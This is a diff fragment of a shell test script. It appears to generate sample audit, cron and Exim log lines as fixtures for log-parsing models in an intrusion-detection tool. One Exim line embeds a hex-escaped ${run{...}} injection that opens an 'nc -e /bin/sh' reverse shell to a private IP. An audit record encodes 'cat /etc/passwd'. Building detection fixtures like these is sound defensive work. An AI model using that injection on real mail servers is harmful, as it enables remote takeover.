+            echo "audispd: type=ANOM_LOGIN_LOCATION msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_LOGIN_SESSIONS msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_LOGIN_TIME msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_MAX_DAC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_MAX_MAC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_MK_EXEC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_MOD_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_PROMISCUOUS msg=audit(1390181243.575:738): dev=vethDvSeyL prom=256 old_prom=256 auid=4294967295 uid=0 gid=0 ses=4294967295" >> $LOG_FILE
+            echo "audispd: type=ANOM_RBAC_FAIL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_RBAC_INTEGRITY_FAIL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_ROOT_TRANS msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "type=AVC msg=audit(1226270358.848:238): avc:  denied  { write } for  pid=13349 comm=\"certwatch\" name=\"cache\" dev=dm-0 ino=218171 scontext=system_u:system_r:certwatch_t:s0 tcontext=system_u:object_r:var_t:s0 tclass=dir" >> $LOG_FILE
+            echo "audispd: type=AVC_PATH msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo 'audispd: type=BPRM_FCAPS msg=audit(1583242318.512:13886958): fver=17474 fp=33 fi=4294967295 fe=4294967295 old_pp=message old_pi="apache2" old_pe="/usr/bin/bash" new_pp=(null) new_pi=(null) new_pe=(null)' >> $LOG_FILE
+            echo "type=CAPSET msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=CHGRP_ID msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=CHUSER_ID msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=CONFIG_CHANGE msg=audit(1368831799.081:466947): auid=4294967295 ses=4294967295 op=\"remove rule\" path=\"/path/to/my/bin0\" key=(null) list=4 res=1" >> $LOG_FILE
+            echo "type=CONFIG_CHANGE msg=audit(1479097266.018:224): auid=500 ses=2 op=\"updated_rules\" path=\"/etc/passwd\" key=\"passwd_changes\" list=4 res=1" >> $LOG_FILE
+            echo "audispd: type=CRED_ACQ msg=audit(1450894634.199:1276): pid=1956 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOG_FILE
+            echo "audispd: type=CRED_DISP msg=audit(1450894635.111:1281): pid=1956 uid=0 auid=0 ses=213 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOG_FILE
+            echo "audispd: type=CRED_REFR msg=audit(1450894634.211:1279): pid=1958 uid=0 auid=0 ses=213 msg='op=PAM:setcred acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOG_FILE
+            echo "audispd: type=CRYPTO_FAILURE_USER msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=CRYPTO_KEY_USER msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=CRYPTO_LOGIN msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=CRYPTO_LOGOUT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=CRYPTO_PARAM_CHANGE_USER msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=CRYPTO_REPLAY_USER msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=CRYPTO_SESSION msg=audit(1150750972.008:3281471): user pid=1111 uid=0 auid=1111 msg='op=start direction=from-server cipher=aes128-ctr ksize=128 rport=40791 laddr=192.168.22.22 lport=22 id=4294967295 exe=\"/usr/sbin/sshd\" (hostname=?, addr=205.22.22.22, terminal=? res=success)'" >> $LOG_FILE
+            echo "audispd: type=CRYPTO_TEST_USER msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo 'audispd: type=CWD msg=audit(1450767416.248:3295858):  cwd="/"' >> $LOG_FILE
+            echo "audispd: type=DAC_CHECK msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=DAEMON_ABORT msg=audit(1339336882.189:9206): auditd error halt, auid=4294967295 pid=3095 res=failed" >> $LOG_FILE
+            echo "audispd: type=DAEMON_ACCEPT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=DAEMON_CLOSE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=DAEMON_CONFIG msg=audit(1264985324.554:4915): auditd error getting hup info - no change, sending auid=? pid=? subj=? res=failed" >> $LOG_FILE
+            echo "audispd: type=DAEMON_END msg=audit(1450876093.165:8729): auditd normal halt, sending auid=0 pid=1 subj= res=success" >> $LOG_FILE
+            echo "audispd: type=DAEMON_RESUME msg=audit(1300385209.456:8846): auditd resuming logging, sending auid=? pid=? subj=? res=success" >> $LOG_FILE
+            echo "audispd: type=DAEMON_ROTATE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=DAEMON_START msg=audit(1450875964.131:8728): auditd start, ver=2.4 format=raw kernel=3.16.0-4-amd64 auid=4294967295 pid=1437 res=failed" >> $LOG_FILE
+            echo "audispd: type=DEL_GROUP msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=DEL_USER msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=EOE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo 'audispd: type=EXECVE msg=audit(1582934957.620:917519): argc=10 a0="find" a1="/usr/lib/php" a2="-mindepth" a3="1" a4="-maxdepth" a5="1" a6="-regex" a7=".*[0-9]\.[0-9]" a8="-printf" a9="%f\n"' >> $LOG_FILE
+            echo "audispd: type=FD_PAIR msg=audit(1431919799.945:49458): fd0=5 fd1=6" >> $LOG_FILE
+            echo "audispd: type=FS_RELABEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=GRP_AUTH msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=INTEGRITY_DATA msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=INTEGRITY_HASH msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=INTEGRITY_METADATA msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=INTEGRITY_PCR msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=INTEGRITY_RULE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=INTEGRITY_STATUS msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=IPC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=IPC_SET_PERM msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=KERNEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=KERNEL_OTHER msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=LABEL_LEVEL_CHANGE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=LABEL_OVERRIDE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=LOGIN msg=audit(1450767601.778:3296208): login pid=15763 uid=0 old auid=4294967295 new auid=0 old ses=4294967295 new ses=2260" >> $LOG_FILE
+            echo "audispd: type=MAC_CIPSOV4_ADD msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_CIPSOV4_DEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_CONFIG_CHANGE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_IPSEC_EVENT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_MAP_ADD msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_MAP_DEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_POLICY_LOAD msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_STATUS msg=audit(1336836093.835:406): enforcing=1 old_enforcing=0 auid=0 ses=2" >> $LOG_FILE
+            echo "audispd: type=MAC_UNLBL_ALLOW msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_UNLBL_STCADD msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MAC_UNLBL_STCDEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MMAP msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MQ_GETSETATTR msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MQ_NOTIFY msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MQ_OPEN msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=MQ_SENDRECV msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=NETFILTER_CFG msg=audit(1479622038.866:2): table=filter family=2 entries=0" >> $LOG_FILE
+            echo "audispd: type=NETFILTER_PKT msg=audit(1487874761.386:228): mark=0xae8a2732 saddr=127.0.0.1 daddr=127.0.0.1 proto=17" >> $LOG_FILE
+            echo "audispd: type=NETFILTER_PKT msg=audit(1487874761.381:227): mark=0x223894b7 saddr=::1 daddr=::1 proto=58" >> $LOG_FILE
+            echo "audispd: type=OBJ_PID msg=audit(1279134100.434:193): opid=1968 oauid=-1 ouid=0 oses=-1 obj=<NULL> ocomm=\"sleep\"" >> $LOG_FILE
+            echo 'audispd: type=PATH msg=audit(1582934957.616:917512): item=0 name="/usr/bin/sort" inode=2883 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' >> $LOG_FILE
+            echo 'audispd: type=PROCTITLE msg=audit(1582934957.616:917512): proctitle=736F7274002D726E' >> $LOG_FILE
+            echo "audispd: type=RESP_ACCT_LOCK msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_ACCT_LOCK_TIMED msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_ACCT_REMOTE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_ACCT_UNLOCK_TIMED msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_ALERT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_ANOMALY msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_EXEC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_HALT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_KILL_PROC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_SEBOOL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_SINGLE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_TERM_ACCESS msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=RESP_TERM_LOCK msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ROLE_ASSIGN msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ROLE_MODIFY msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ROLE_REMOVE msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=SELINUX_ERR msg=audit(1311948547.151:138): op=security_compute_av reason=bounds scontext=system_u:system_r:anon_webapp_t:s0-s0:c0,c100,c200 tcontext=system_u:object_r:security_t:s0 tclass=dir perms=ioctl,read,lock" >> $LOG_FILE
+            echo "audispd: type=SERVICE_START msg=audit(1450876900.115:30): pid=1 uid=0 auid=4294967295 ses=4294967295 msg=' comm=\"Serv-U\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'" >> $LOG_FILE
+            echo "audispd: type=SERVICE_STOP msg=audit(1450876900.115:31): pid=1 uid=0 auid=4294967295 ses=4294967295 msg=' comm=\"Serv-U\" exe=\"/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'" >> $LOG_FILE
+            echo "audispd: type=SOCKADDR msg=audit(1582935421.377:947594): saddr=01002F6465762F6C6F6700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" >> $LOG_FILE
+            echo "audispd: type=SOCKETCALL msg=audit(1134642541.683:201): nargs=3 a0=10 a1=3 a2=9" >> $LOG_FILE
+            echo 'audispd: type=SYSCALL msg=audit(1582934957.616:917513): arch=c000003e syscall=2 success=yes exit=3 a0=7f5b904e4988 a1=80000 a2=1 a3=7f5b906ec518 items=1 ppid=25680 pid=25684 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sort" exe="/usr/bin/sort" key=(null)' >> $LOG_FILE
+            echo "audispd: type=SYSTEM_BOOT msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=SYSTEM_RUNLEVEL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=SYSTEM_SHUTDOWN msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=TRUSTED_APP msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=TTY msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=USER_ACCT msg=audit(1234877011.795:7732): user pid=26127 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\"root\" exe=\"/usr/sbin/sshd\" (hostname=jupiter.example.com, addr=192.168.2.100, terminal=ssh res=success)'" >> $LOG_FILE
+            echo "audispd: type=USER_AUTH msg=audit(1451403184.143:1834): pid=3380 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"toor\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=failed'" >> $LOG_FILE
+            echo "audispd: type=USER_AUTH msg=audit(1451403193.995:1835): pid=3380 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"toor\" exe=\"/usr/sbin/sshd\" hostname=192.168.2.100 addr=192.168.2.100 terminal=ssh res=success'" >> $LOG_FILE
+            echo "audispd: type=USER_AVC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=USER_CHAUTHTOK msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=USER_CMD msg=audit(1450785575.705:3316357): user pid=21619 uid=0 auid=526 msg='cwd=\"/home/hi\" cmd=\"/bin/bash\" (terminal=pts/0 res=success)'" >> $LOG_FILE
+            echo "audispd: type=USER_END msg=audit(1450767601.813:3296218): user pid=15764 uid=0 auid=0 msg='PAM: session close acct=\"root\" : exe=\"/usr/sbin/crond\" (hostname=?, addr=?, terminal=cron res=success)'" >> $LOG_FILE
+            echo "audispd: type=USER_ERR msg=audit(1450770602.157:3300444): user pid=16643 uid=0 auid=4294967295 msg='PAM: bad_ident acct="?" : exe=\"/usr/sbin/sshd\" (hostname=111.111.211.38, addr=111.111.211.38, terminal=ssh res=failed)'" >> $LOG_FILE
+            echo "audispd: type=USER_LABELED_EXPORT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=USER_LOGIN msg=audit(1450770603.209:3300446): user pid=16649 uid=0 auid=4294967295 msg='acct=\"root\": exe=\"/usr/sbin/sshd\" (hostname=?, addr=11.111.53.58, terminal=sshd res=failed)'" >> $LOG_FILE
+            echo "audispd: type=USER_LOGOUT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=USER_MAC_POLICY_LOAD msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=USER_MGMT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=USER_ROLE_CHANGE msg=audit(1280266360.845:51): user pid=1978 uid=0 auid=500 subj=system_u:system_r:local_login_t:s0-s0:c0.c1023 msg='pam: default-context=user_u:system_r:unconfined_t:s0 selected-context=user_u:system_r:unconfined_t:s0: exe=\"/bin/login\" (hostname=?, addr=?, terminal=tty1 res=success)'" >> $LOG_FILE
+            echo "audispd: type=USER_SELINUX_ERR msg=audit(1311948547.151:138): Text" >> $LOG_FILE
+            echo "audispd: type=USER_START msg=audit(1450771201.437:3301540): user pid=16878 uid=0 auid=0 msg='PAM: session open acct=\"root\" : exe=\"/usr/sbin/crond\" (hostname=?, addr=?, terminal=cron res=success)'" >> $LOG_FILE
+            echo "audispd: type=USER_TTY msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=USER_UNLABELED_EXPORT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=USYS_CONFIG msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=VIRT_CONTROL msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=VIRT_MACHINE_ID msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=VIRT_RESOURCE msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audisp-remote: queue is full - dropping event" >> $LOG_FILE
+            echo "audispd: queue is full - dropping event" >> $LOG_FILE
+            echo "audispd: type=UNKNOWN[1327] msg=audit(1522927552.749:917): proctitle=636174002F6574632F706173737764" >> $LOG_FILE
+            ;;
+        CronParsingModel)
+            echo "CRON[25537]: (root) CMD ping 8.8.8.8" > $LOG_FILE
+            echo "CRON[25537]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
+            echo "cron[25537]: (*system*mailman) RELOAD (/var/spool/cron/mailman)" >> $LOG_FILE
+            echo "CRON[12461]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)" >> $LOG_FILE
+            echo "CRON[12460]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
+            echo "CRON[13229]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)" >> $LOG_FILE
+            echo "CRON[14368]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)" >> $LOG_FILE
+            ;;
+        EximGenericParsingModel)
+            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOG_FILE
+            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOG_FILE
+            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOG_FILE
+            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOG_FILE
+            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOG_FILE
+            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOG_FILE
+            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOG_FILE
+            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOG_FILE
+            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOG_FILE
+            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOG_FILE
+            # following examples are covering exim failure message types. The examples are taken from
+            # https://forums.cpanel.net/resources/reading-and-understanding-the-exim-main_log.383/
+            echo "2014-09-29 21:27:08 1XYdJu-002e6P-9F SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=6601: host mta5.am0.yahoodns.net [66.196.118.240]: 421 4.7.0 [GL01] Message from (184.171.253.133) temporarily deferred - 4.16.50. Please refer to http://postmaster.yahoo.com/errors/postmaster-21.html" >> $LOG_FILE
+            echo "2020-04-28 22:08:03 1m1x23-2011cZ-MN H=mta7.am0.yahoodns.net [67.195.228.106]: SMTP error from remote mail server after pipelined MAIL FROM:<SENDER@senderdomain.com> SIZE=1758: 421 4.7.0 [TSS04] Messages from 184.171.253.133 temporarily deferred due to unexpected volume or user complaints - 4.16.55.1; see https://postmaster.verizonmedia.com/error-codes" >> $LOG_FILE
+            echo "2014-09-12 08:01:12 1XSLn4-003Fa1-OX SMTP error from remote mail server after end of data: host gmail-smtp-in.l.google.com [173.194.66.27]: 421-4.7.0 [77.69.28.195 15] Our system has detected an unusual rate of\n421-4.7.0 unsolicited mail originating from your IP address. To protect our\n421-4.7.0 users from spam, mail sent from your IP address has been temporarily\n421-4.7.0 rate limited. Please visit\n421-4.7.0 http://www.google.com/mail/help/bulk_mail.html to review our Bulk\n421 4.7.0 Email Senders Guidelines. q4si1448293wij.85 - gsmtp" >> $LOG_FILE
+            echo "2014-09-18 13:44:19 1XUb4M-000v5R-6R SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=1811: host mta7.am0.yahoodns.net [66.66.66.66]: 421 4.7.1 [TS03] All messages from 5.196.113.212 will be permanently deferred; Retrying will NOT succeed. See http://postmaster.yahoo.com/421-ts03.html" >> $LOG_FILE
+            echo "TO:<someone@someaddress>: host mx.someaddress.com [20.20.20.20]: 450 4.7.1 Client host rejected: cannot find your hostname, [20.20.20.20] 2014-09-21 16:06:05 1XUKFa-0003bb-EM ** someone@someaddress>: retry timeout exceeded" >> $LOG_FILE
+            echo "2014-10-10 10:25:01 1XcKLM-003IGU-Fr SMTP error from remote mail server after RCPT TO:<ma@bol.com>: host pro-mail-mx-002.bol.com [20.20.20.20]: 450 4.7.1 Service unavailable" >> $LOG_FILE
+            echo "2014-09-24 12:59:49 1XWqqy-00028x-FK == test@badluckbryan.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<test@gylsystems.com>: host gylsystems.com [69.69.69.69]: 451 Temporary local problem - please try later" >> $LOG_FILE
+            echo "2014-11-24 11:25:33 H=localhost (mail.fictional.example) [::1]:49956 sender verify defer for <aaron@domain.com>: require_files: error for /home/aaron/etc/domain.com: Permission denied" >> $LOG_FILE
+            echo "2014-11-24 11:25:33 H=localhost (srv-hs1.netsons.net) [::1]:49956 F=<aaron@domain.com> A=dovecot_login:aaron@domain.com temporarily rejected RCPT <test@pleasecheck.net>: Could not complete sender verify" >> $LOG_FILE
+            echo "2014-09-13 11:37:53 1XSdCz-00049U-5A ==aaron@domain.com R=lookuphost T=remote_smtp defer (-44): SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 452 <aron@domain.com> Domain size limit exceeded" >> $LOG_FILE
+            echo "2014-08-31 08:43:16 1XO5PX-0006SC-Qa ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after RCPT TO:<aaron@domain.com>: host mail.domain.com [10.5.40.204]: 550-Verification for <garfield@domain.com>\n550-The mail server could not deliver mail to garfield@domain.com. The account or domain may not exist, they may be blacklisted, or missing the proper dns entries.\n550 Sender verify failed" >> $LOG_FILE
+            echo "SMTP error from remote mail server after RCPT TO:: host mail.fictional.example[10.5.40.204]: 550-Sender has no A, AAAA, or MX DNS records. mail.fictional.example\n550 l mail.fictional.example\nVerify the zone file in /etc/named for the correct information. If it appear correct, you can run named-checkzone domain.com domain.com.db to verify if named is able to load the zone." >> $LOG_FILE
+            echo "Diagnostic-Code: X-Postfix; host mail1.domain.com [10.5.40.204] said: 550 5.7.1 Message rejected due to content restrictions (in reply to end of DATA command)\nWhen you see an error such as 550 5.7.1" >> $LOG_FILE
+            echo "Final-Recipient: rfc822;aaron@domain.com\nAction: failed\nStatus: 5.5.0\nDiagnostic-Code: smtp;550-Please turn on SMTP Authentication in your mail client.\n550-mail.fictional.example [10.5.40.204]:58133 is not permitted to relay 550 through this server without authentication." >> $LOG_FILE
+            echo "DHE-RSA-AES256-SHA:256: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1834: host mail.fictional.example [10.5.40.204..212]: 550 \"REJECTED - Bad HELO - Host impersonating [mail.fictional2.example]\"" >> $LOG_FILE
+            echo "2014-08-31 08:43:16 1XO5PY-0006SO-GS <= <> R=1XO5PX-0006SC-Qa U=mailnull P=local S=1951 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com" >> $LOG_FILE
+            echo "SMTP error from remote mail server after MAIL FROM:<aaron@domain.com>: host mail.fictional.example [10.5.40.204]: 553 sorry, your domain does not exists." >> $LOG_FILE
+            echo "2014-11-26 10:26:32 1XtYro-004Ecv-65 ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after MAIL FROM:<aaron@domain.com> SIZE=1604: host mail.fictional.example [10.5.40.204]: 553 <aaron@domain.com> unable to verify address\nVerify that SMPT authentication has been enabled." >> $LOG_FILE
+            echo "[15:03:30 hosts5 root /var/log]cPs# grep 1XeRdP-0006JC-FO exim_mainlog 2014-10-15 12:41:11 1XeRdP-0006JC-FO <= <> R=1XeRdF-0006HI-EY U=mailnull P=local S=5445 T=\"Mail delivery failed: returning message to sender\" for aaron@domain.com 2014-10-15 12:41:11 cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1XeRdP-0006JC-FO 2014-10-15 12:42:12 1XeRdP-0006JC-FO ** aaron@domain.com R=dkim_lookuphost T=dkim_remote_smtp: SMTP error from remote mail server after end of data: host mail.fictional.example [10.5.40.204]: 554 rejected due to spam content" >> $LOG_FILE
+            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS H=mail.fictional.example [10.5.40.204]:4779 Warning: \"SpamAssassin as marka22 detected message as spam (11.0)\"" >> $LOG_FILE
+            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS <=10.5.40.204 H=mail.fictional.example[10.5.40.204]:4779 P=esmtp S=491878 id=dos45yx4zbmri7f@domain.com T="Payment confirmation: 7037487121" for aaron@domain.net [" >> $LOG_FILE
+            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS => aaron  <aaron@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOG_FILE
+            echo "2014-10-01 15:12:26 1XZKdg-0001g3-JS Completed 2014-10-01 15:30:35 1XZKvG-0002HW-ML H=(12-12-12-12.domain.net [10.5.40.204]:65376 Warning: \"SpamAssassin as marka22 detected message as spam (7.2)\"" >> $LOG_FILE
+            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML <= item@something.net H=(12-12-12-12.domain.net [10.5.40.204]:65376 P=esmtp S=519381 id=dos45yx4zbmri7f@domain.com T=\"Payment confirmation: 7037487121\" for mark@domain.com 2014-10-01 15:30:35 1XZKvG-0002HW-ML => mark <mark@domain.net [> R=virtual_user_spam T=virtual_userdelivery_spam" >> $LOG_FILE
+            echo "2014-10-01 15:30:35 1XZKvG-0002HW-ML Completed" >> $LOG_FILE
+            echo "2014-09-10 13:06:55 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOG_FILE
+            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG H=mail.fictional.example[10.5.40.204]:46793 Warning: \"SpamAssassin as cpaneleximscanner detected OUTGOING smtp message as NOT spam (-0.1)\"" >> $LOG_FILE
+            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG <= bob@bob.com H=mail.fictional.example [10.5.40.204]:46793 P=esmtpsa X=TLSv1:AES128-SHA:128 A=dovecot_login:aaron@domain.com S=18635 T=\"14\\\" plates\" for live@somedomain.com" >> $LOG_FILE
+            echo "2014-09-10 13:06:56 1XRlM6-003yMv-KG SMTP connection outbound 1410368816 1XRlM6-003yMv-KG domain.com live@somedomain.com" >> $LOG_FILE
+            echo "2014-09-10 13:07:22 1XRlM6-003yMv-KG => live@somedomain.com R=dkim_lookuphost T=dkim_remote_smtp H=mail.fictional.example [10.5.40.204] X=TLSv1:DHE-RSA-AES256-SHA:256 C=\"250 OK id=1XRlMC-0006w5-F4\" 2014-09-10 13:07:22 1XRlM6-003yMv-KG Completed" >> $LOG_FILE
